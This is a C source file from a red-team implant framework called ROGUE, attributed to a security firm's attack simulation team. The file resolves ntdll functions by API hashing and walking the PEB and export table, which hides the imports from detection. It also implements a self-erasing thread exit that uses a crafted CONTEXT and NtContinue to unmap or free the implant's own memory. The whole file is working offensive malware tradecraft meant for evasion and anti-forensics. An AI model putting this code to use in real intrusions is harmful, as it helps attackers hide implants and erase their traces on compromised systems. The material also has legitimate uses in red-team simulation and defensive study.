/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtUnmapViewOfSection );
	D_API( NtQueryVirtualMemory );
	D_API( NtFreeVirtualMemory );
	D_API( RtlExitUserProcess );
	D_API( RtlExitUserThread );
	D_API( RtlCaptureContext );
	D_API( NtContinue );
} API ;

/* API Hashes */
#define H_API_NTUNMAPVIEWOFSECTION	0x6aa412cd /* NtUnmapViewOfSection */
#define H_API_NTQUERYVIRTUALMEMORY	0x10c0e85d /* NtQueryVirtualMemory */
#define H_API_NTFREEVIRTUALMEMORY	0x2802c609 /* NtFreeVirtualMEmory */
#define H_API_RTLEXITUSERPROCESS	0x0057c72f /* RtlExitUserPRocess */
#define H_API_RTLEXITUSERTHREAD		0x2f6db5e8 /* RtlExitUserThread */	
#define H_API_RTLCAPTURECONTEXT		0xeba8d910 /* RtlCaptureContext */
#define H_API_NTCONTINUE		0xfc3a6c2c /* NtContinue */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Exits depending on the requested configuration
 *
!*/
D_SEC( B ) VOID Exit( _In_ UINT32 ExitMode )
{
	API				Api;
	CONTEXT				Ctx;
	MEMORY_BASIC_INFORMATION	Mbi;

	SIZE_T				Len = 0;

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlZeroMemory( &Mbi, sizeof( Mbi ) );

	Api.NtUnmapViewOfSection = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTUNMAPVIEWOFSECTION ) );
	Api.NtQueryVirtualMemory = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTQUERYVIRTUALMEMORY ) );
	Api.NtFreeVirtualMemory  = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTFREEVIRTUALMEMORY ) );
	Api.RtlExitUserProcess   = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_RTLEXITUSERPROCESS ) );
	Api.RtlExitUserThread    = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_RTLEXITUSERTHREAD ) );
	Api.RtlCaptureContext    = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_RTLCAPTURECONTEXT ) );
	Api.NtContinue           = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTCONTINUE ) );

	/* What exit mode was requested? */
	switch( ExitMode ) {
		case EXIT_MODE_PROCESS:
			/* Exit the current process */
			Api.RtlExitUserProcess( STATUS_SUCCESS );
			break;
		case EXIT_MODE_THREAD:
			/* Exit the current thread */
			Api.RtlExitUserThread( STATUS_SUCCESS );
			break;
		case EXIT_MODE_THREAD_FREE:
			/* Exit the current thread and free itself */
			if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_PTR( Start ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
				Ctx.ContextFlags = CONTEXT_FULL; Api.RtlCaptureContext( &Ctx );

				/* Was it mapped via section? */
				if ( Mbi.Type == MEM_MAPPED ) 
				{
				#if defined( _WIN64 )
					Ctx.Rip = U_PTR( Api.NtUnmapViewOfSection );
					Ctx.Rsp = ( Ctx.Rsp &~ ( 0x1000 - 1 ) ) - sizeof( PVOID );
					Ctx.Rcx = U_PTR( NtCurrentProcess() );
					Ctx.Rdx = U_PTR( Mbi.BaseAddress );
					*( ULONG_PTR * )( Ctx.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.RtlExitUserThread );
				#else
					Ctx.Eip = U_PTR( Api.NtUnmapViewOfSection );
					Ctx.Esp = ( Ctx.Esp &~ ( 0x1000 - 1 ) ) - sizeof( PVOID );
					*( ULONG_PTR * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.RtlExitUserThread );
					*( ULONG_PTR * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( NtCurrentProcess() );
					*( ULONG_PTR * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( Mbi.BaseAddress );
				#endif
					/* Execute the context structure */
					Ctx.ContextFlags = CONTEXT_FULL; Api.NtContinue( &Ctx, FALSE );
				}
				/* Was this a virtual allocation? */
				else if ( Mbi.Type == MEM_PRIVATE ) 
				{
				#if defined( _WIN64 )
					Ctx.Rip = U_PTR( Api.NtFreeVirtualMemory );
					Ctx.Rsp = ( Ctx.Rsp &~ ( 0x1000 - 1 ) ) - sizeof( PVOID );
					Ctx.Rcx = U_PTR( NtCurrentProcess() );
					Ctx.Rdx = U_PTR( &Mbi.BaseAddress );
					Ctx.R8  = U_PTR( &Len );
					Ctx.R9  = U_PTR( MEM_RELEASE );
					*( ULONG_PTR * )( Ctx.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.RtlExitUserThread );
				#else
					Ctx.Eip = U_PTR( Api.NtFreeVirtualMemory );
					Ctx.Esp = ( Ctx.Esp &~ ( 0x1000 - 1 ) ) - sizeof( PVOID );
					*( ULONG_PTR * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.RtlExitUserThread );
					*( ULONG_PTR * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( NtCurrentProcess() );
					*( ULONG_PTR * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( &Mbi.BaseAddress );
					*( ULONG_PTR * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = U_PTR( &Len );
					*( ULONG_PTR * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x4 ) ) = U_PTR( MEM_RELEASE );
				#endif
					/* Execute the context structure */
					Ctx.ContextFlags = CONTEXT_FULL; Api.NtContinue( &Ctx, FALSE );
				};
			};
			break;
		case EXIT_MODE_NONE:
			/* Nothing! We return. Possible exploit? */
			break;
	};

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlZeroMemory( &Mbi, sizeof( Mbi ) );
};
